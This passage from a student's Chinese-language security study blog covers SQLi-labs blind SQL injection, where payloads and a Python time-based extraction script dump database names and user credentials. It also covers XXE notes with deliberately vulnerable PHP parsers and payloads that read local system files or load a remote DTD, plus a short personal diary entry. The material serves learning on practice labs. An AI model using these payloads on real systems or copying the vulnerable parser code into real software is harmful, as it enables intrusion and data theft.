<li><code>id = 1&#39; and ascii(substr(group_concat(column_name) from information_schema.columns where table_shcema = database() and table_name = &#39;users&#39;),1 ,1))&gt;99 --+</code></li>
<li><code>id = 1&#39; and length((select group_concat(username, password) from users))&gt;13 --+</code></li>
<li><code>id = 1&#39; and ascii(substr(group_concat(username, password) from users),1 ,1))&gt;99 --+</code></li>
</ul>
<p>想过要不要写一个整合的代码，但sqlmap比较好用，等我以后来补充。</p>
<p>sqlmap be like:</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/sqlmap2.png" class>

<img src="/rustymoon/2023/12/07/SQLi-labs/sqlmap3.png" class>

<img src="/rustymoon/2023/12/07/SQLi-labs/sqlmap1.png" class>



<p><code>#科技的力量</code></p>
<hr>


<h1 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h1><p>上面的是报错注入，后面的还有一种盲注，对报错信息进行了处理——即它不告诉你。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>	
  	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>
  	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>
    	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/font>"</span><span class="token punctuation">;</span>
  	<span class="token punctuation">&#125;</span>
	<span class="token keyword">else</span> 
	<span class="token punctuation">&#123;</span>
	
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font size="5" color="#FFFF00">'</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'You are in...........'</span><span class="token punctuation">;</span>
	<span class="token comment">//print_r(mysql_error());</span>
	<span class="token comment">//echo "You have an error in your SQL syntax";</span>
	<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>&lt;/font>"</span><span class="token punctuation">;</span>	
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;font color= "#0000ff" font size= 3>'</span><span class="token punctuation">;</span>	
	
	<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>两行注释就完成无回显。</p>
<p>如果取消对 print_r(mysql_error()) 的注释，写 id&#x3D;1’</p>
<img src="/rustymoon/2023/12/07/SQLi-labs/91.png" class>

<p>不然就是只有一个 You are in </p>
<p>对于这种，就用 时间盲注</p>
<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><ul>
<li>if()</li>
<li>sleep()</li>
<li>length()</li>
<li>ascii()</li>
</ul>
<blockquote>
<p>if(ascii(…) &#x3D; 115, sleep(5), 1): 如果截取的字符的 ASCII 值等于 115（ASCII 值为 s），则执行 sleep(5)，即使服务器等待 5 秒钟；否则，返回 1。</p>
</blockquote>
<p>这个用代码效果会更好。</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">?id=1' and if(1=1,sleep(5),1)--+
判断参数构造。

?id=1'and if(length((select database()))>9,sleep(5),1)--+
判断数据库名长度
 
?id=1'and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+
逐一判断数据库字符

?id=1'and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>13,sleep(5),1)--+
判断所有表名长度
 
?id=1'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>99,sleep(5),1)--+
逐一判断表名

?id=1'and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>20,sleep(5),1)--+
判断所有字段名的长度
 
?id=1'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1))>99,sleep(5),1)--+
逐一判断字段名。

?id=1' and if(length((select group_concat(username,password) from users))>109,sleep(5),1)--+
判断字段内容长度
 
 
 
?id=1' and if(ascii(substr((select group_concat(username,password) from users),1,1))>50,sleep(5),1)--+
逐一检测内容。
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>代码在之前那个的基础上修改就行了。</p>
<p>下面这个是获取database名的代码示例：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token string">'http://xxx/?id=1\' and if(ascii(substr((select database()), &#123;0&#125;, 1))=&#123;1&#125;, sleep(5), 1)--+'</span>

<span class="token keyword">def</span> <span class="token function">guess_character</span><span class="token punctuation">(</span>position<span class="token punctuation">,</span> ascii_value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>position<span class="token punctuation">,</span> ascii_value<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> response<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ascii_value<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>

position <span class="token operator">=</span> <span class="token number">1</span>
characters <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> ascii_value <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        character <span class="token operator">=</span> guess_character<span class="token punctuation">(</span>position<span class="token punctuation">,</span> ascii_value<span class="token punctuation">)</span>
        <span class="token keyword">if</span> character <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
            characters<span class="token punctuation">.</span>append<span class="token punctuation">(</span>character<span class="token punctuation">)</span>
            position <span class="token operator">+=</span> <span class="token number">1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>character<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>

database_name <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>characters<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>database_name<span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h1 id="maybe-or-maybe-not"><a href="#maybe-or-maybe-not" class="headerlink" title="maybe or maybe not"></a>maybe or maybe not</h1><p>前几章的基本是这些。</p>
<p>(more)[<a href="http://drops.xmd5.com/static/drops/tips-7840.html]">http://drops.xmd5.com/static/drops/tips-7840.html]</a></p>
<p>(and)[<a href="https://ctf-wiki.org/web/sqli/#_10]">https://ctf-wiki.org/web/sqli/#_10]</a></p>
<p>(more技巧)[<a href="http://drops.xmd5.com/static/drops/tips-7299.html]">http://drops.xmd5.com/static/drops/tips-7299.html]</a></p>
]]></content>
      <tags>
        <tag>LEARN</tag>
        <tag>SQL Injection</tag>
      </tags>
  </entry>
  <entry>
    <title>daily</title>
    <url>/rustymoon/2023/11/26/daily/</url>
    <content><![CDATA[<p>No Glamour in the hammer~</p>
<span id="more"></span>

<h1 id="11-26"><a href="#11-26" class="headerlink" title="11-26"></a>11-26</h1><p>这个周在当尖叫皇后，就是别人负责皇后我负责尖叫。</p>
<p>我也不知道为什么这个周会过得如此迷惑的忙碌。</p>
<p>可能是快来到的期末和一堆被冷落的作业。</p>
<p>所以本周我就做了一个firewall ppt，做了实验课的实验一。</p>
<p>迷茫、惶恐、无语、怒极反笑。</p>
<p>总结一下就是，看见firewall这个词就想吐了。</p>
<p>在周天晚上一把子把所有有关firewall的笔记都删除了，可能得缓缓才能写出笔记上传。而且我的课设作业和实验一个接一个，这辈子没这么烦过。</p>
<p>之前还在问chatgpt怎么写weekly to-do list，现在我已经知道了。这么多破事（姑且让我这么称呼吧），好了写完这个我就要回去了，我要去买晚饭我要饿死了。</p>
<p>回去路上整理to do list吧。<br>一张心情写照：</p>
<img src="/rustymoon/2023/11/26/daily/%E9%9D%A2%E5%AF%B9jyp.jpg" class>

<h1 id="11-27"><a href="#11-27" class="headerlink" title="11-27"></a>11-27</h1><p>今天稍微策划了一下时间，好了我现在要去学数电了，在这之前我学了ssrf和sql注入了的一部分，但是但是，还没有彻底搞懂，之前卡住我的那个demo问题原来是变量名少打一个h……这个键盘的h键真是……<br>配图以表心情：</p>
<img src="/rustymoon/2023/11/26/daily/%E7%94%84%E5%AC%9B%E4%BC%A01.jpg" class>

<h1 id="12-5"><a href="#12-5" class="headerlink" title="12-5"></a>12-5</h1><p>终于把这个主题进一步修改了……不过真的花了很长时间找有用的。<br>怎么这个学期就又要结束了？<br>期末袭来。</p>
]]></content>
      <tags>
        <tag>orn</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE的一些学习</title>
    <url>/rustymoon/2023/11/30/XXE-test/</url>
    <content><![CDATA[<p>不知道从何说起就这放一张图吧。纪念一下第一次看懂port swigger的鸟语。</p>
<img src="/rustymoon/2023/11/30/XXE-test/xxelab1.png" class>

<span id="more"></span>

<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><blockquote>
<p>Extensible Markup Language</p>
</blockquote>
<p>a markup language and file format</p>
<p>主要目的是序列化，即存储、传输、重构任意数据。</p>
<p>一个example：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">//XML声明即是位于XML文档开始部分的第一行，规定了xml版本和编码格式
<span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>

//每个xml文档必有一个根元素，这里指<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget me this weekend!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>通过 XML 您可以发明自己的标签<br>上面实例中的标签没有在任何 XML 标准中定义过（比如 <code>&lt;to&gt;</code>和 <code>&lt;from&gt;</code>）。这些标签是由 XML 文档的创作者发明的。</p>
<p>这是因为 XML 语言没有预定义的标签。</p>
<p>HTML 中使用的标签都是预定义的。HTML 文档只能使用在 HTML 标准中定义过的标签（如 <code>&lt;p&gt;</code>、<code>&lt;h1&gt;</code> 等等）。</p>
<p>XML 允许创作者定义自己的标签和自己的文档结构。</p>
<h2 id="与HTML有区别"><a href="#与HTML有区别" class="headerlink" title="与HTML有区别"></a>与HTML有区别</h2><p>XML 不是 HTML 的替代。</p>
<p>XML 和 HTML 为不同的目的而设计：</p>
<ul>
<li><p>XML 被设计用来传输和存储数据，其焦点是数据的内容。</p>
</li>
<li><p>HTML 被设计用来显示数据，其焦点是数据的外观。</p>
</li>
<li><p>HTML 旨在显示信息，而 XML 旨在传输信息。</p>
</li>
</ul>
<p><a href="https://www.runoob.com/xml/xml-usage.html">更多详情在这里</a></p>
<h2 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h2><blockquote>
<p>Document Type Definition</p>
</blockquote>
<h3 id="DTD引用"><a href="#DTD引用" class="headerlink" title="DTD引用"></a>DTD引用</h3><ul>
<li><p>DTD内部声明<br><code>&lt;!DOCTYPE root_element [declare]&gt;</code></p>
</li>
<li><p>DTD外部引用<br><code>&lt;!DOCTYPE root_element  SYSTEM &quot;enternal DTD file path/url&quot;&gt;</code></p>
</li>
<li><p>引用公共DTD<br><code>&lt;!DOCTYPE root_element  PUBLIC &quot;DTD name&quot; &quot;public dtd url&quot;&gt;</code></p>
</li>
</ul>
<h3 id="DTD实体声明"><a href="#DTD实体声明" class="headerlink" title="DTD实体声明"></a>DTD实体声明</h3><ul>
<li><p>内部实体声明<br><code>&lt;!ENTITY entity_name &quot;entity value&quot;&gt;</code></p>
</li>
<li><p>外部实体声明<br><code>&lt;!ENTITY entity_name SYSTEM &quot;url/uri&quot;&gt;</code></p>
</li>
<li><p>通用实体<br><code>&amp;</code>引用的实体，在DTD中定义，xml中引用</p>
</li>
<li><p>参数实体<br><code>%</code>引用的实体，在DTD中定义，DTD中使用，可以在外部引用</p>
</li>
</ul>
<h1 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h1><p><a href="https://uuzdaisuki.com/2018/07/23/xml%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93/">一个关于XML注入的简单总结</a></p>
<h1 id="XXE-XML-External-Entity-Injection"><a href="#XXE-XML-External-Entity-Injection" class="headerlink" title="XXE(XML External Entity Injection)"></a>XXE(XML External Entity Injection)</h1><blockquote>
<p>XML注入的一种，针对于外部实例</p>
</blockquote>
<h2 id="demo-test"><a href="#demo-test" class="headerlink" title="demo test"></a>demo test</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xml'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$xml</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>用 POST 进行传参 ：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">xml=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>Tove<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>Jani<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget me this weekend!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到结果：</p>
<img src="/rustymoon/2023/11/30/XXE-test/xxedemo.png" class>


<hr>

<p>进行进一步的测试</p>
<p>升级一下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

    <span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//用来禁用或启用 libxml 库中的实体加载器。参数 false 表示启用实体加载器。</span>
    <span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从 PHP 的输入流中读取数据，并将其存储在 $xmlfile 变量中。</span>
    <span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建了一个新的 DOMDocument 对象，该对象表示一个 XML 或 HTML 文档。</span>
    <span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//使用 $xmlfile 中的 XML 数据加载 DOMDocument 对象，后面两个是解析选项</span>
    <span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//将 DOMDocument 对象转换为 SimpleXMLElement 对象，以便更容易地处理 XML 数据</span>
    <span class="token keyword">echo</span> <span class="token variable">$creds</span><span class="token punctuation">;</span><span class="token comment">//将 SimpleXMLElement 对象转换为字符串，并输出</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="直接利用"><a href="#直接利用" class="headerlink" title="直接利用"></a>直接利用</h2><p>以Windows环境为例：</p>
<p>post传入</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset">
	&lt;!ENTITY b SYSTEM "file:///c:/windows/win.ini">
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>喜提：<br><code>; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1</code></p>
<h2 id="远程调用DTD"><a href="#远程调用DTD" class="headerlink" title="远程调用DTD"></a>远程调用DTD</h2><p>在直接利用的基础上修改</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">a</span> <span class="token punctuation">[</span><span class="token internal-subset">
	&lt;!ENTITY b SYSTEM "http://xxxx/xxx.dtd">
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>c</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&b;">&amp;b;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>c</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>xxx.dtd中写：</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini&quot; &gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>


<p>效果same</p>
<hr>

<h2 id="xxe-lab-test"><a href="#xxe-lab-test" class="headerlink" title="xxe-lab test"></a>xxe-lab test</h2><p>在进行next level前，来做一个简单的靶场xxe lab</p>
<p>做的php版本（大差不差）</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">//doLogin.php
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">/**
* autor: c0ny1
* date: 2018-2-7
*/</span>

<span class="token variable">$USERNAME</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//账号</span>
<span class="token variable">$PASSWORD</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span> <span class="token comment">//密码</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>

<span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">try</span><span class="token punctuation">&#123;</span>
  <span class="token comment">//可以参考上面那个升级版demo的解释</span>
	<span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$creds</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
	<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$creds</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span>

  <span class="token comment">//进行检查</span>
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span> <span class="token operator">==</span> <span class="token variable">$USERNAME</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$password</span> <span class="token operator">==</span> <span class="token variable">$PASSWORD</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>	
<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;result>&lt;code>%d&lt;/code>&lt;msg>%s&lt;/msg>&lt;/result>"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token variable">$e</span><span class="token operator">-></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: text/html; charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>主要看<code>echo</code>在echo个什么，很明显的是<code>$result</code>，所以回去看这个参数有些什么。</p>
<p><code>$username</code> &amp; <code>msg</code></p>
<p>通过抓包看到的是</p>
<img src="/rustymoon/2023/11/30/XXE-test/burpxxe.png" class>

<p>所以实体要在<code>$username</code>里面进行引用</p>
<p>then it goes like:</p>
<img src="/rustymoon/2023/11/30/XXE-test/xxelabwin.png" class>

<hr>

<p>在port swigger lab的XXE 1时，非常简单一个道理：</p>
<p>就如图所示：</p>
<img src="/rustymoon/2023/11/30/XXE-test/xxelab1.png" class>

<hr>
<hr>

<h1 id="Next-Level"><a href="#Next-Level" class="headerlink" title="Next Level"></a>Next Level</h1><blockquote>
<p>当文件内容比较非常规的时候，读取解析会出现错误</p>
</blockquote>
<p>比如这个：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">KITS.AI
# etc :/eta heard him say
....we can go&amp;wherever%you###like<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>再次执行之前成功的payload就会得到很多报错：</p>
<img src="/rustymoon/2023/11/30/XXE-test/error.png" class>

<hr>

<p>解决这个问题的一个有效方法就是使用<code>&lt;![CDATA[]]&gt;</code></p>
<blockquote>
<p>在 XML 中，<!--[CDATA[]]--> 的作用是保护一些特殊字符，例如小于号 &lt; 等，使其不被解析。这是因为在 XML 文档的解析过程中，字符 &lt; 和 &amp; 会被解析为新元素或字符实体的开始。因此，如果希望一些字符被视为纯文本而不是 XML 语法，可以将它们放在 <!--[CDATA[]]--> 中。</p>
</blockquote>
<p>乍一看心情是：what are you fucking talking about？</p>
<p>举个例子</p>
<p>用初始xml进行改造：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">creds</span> <span class="token punctuation">[</span><span class="token internal-subset">
   &lt;!ENTITY goodies SYSTEM "file:///c:/windows/win.ini">
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&goodies;">&amp;goodies;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>

<p>在引用上加<code>&lt;![CDATA[]]&gt;</code></p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">creds</span> <span class="token punctuation">[</span><span class="token internal-subset">
   &lt;!ENTITY goodies SYSTEM "file:///C:/Users/haerinwon/Desktop/ai.txt">
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>creds</span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[&amp;goodies;]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>creds</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到结果是<code>&amp;goodies;</code></p>
<hr>


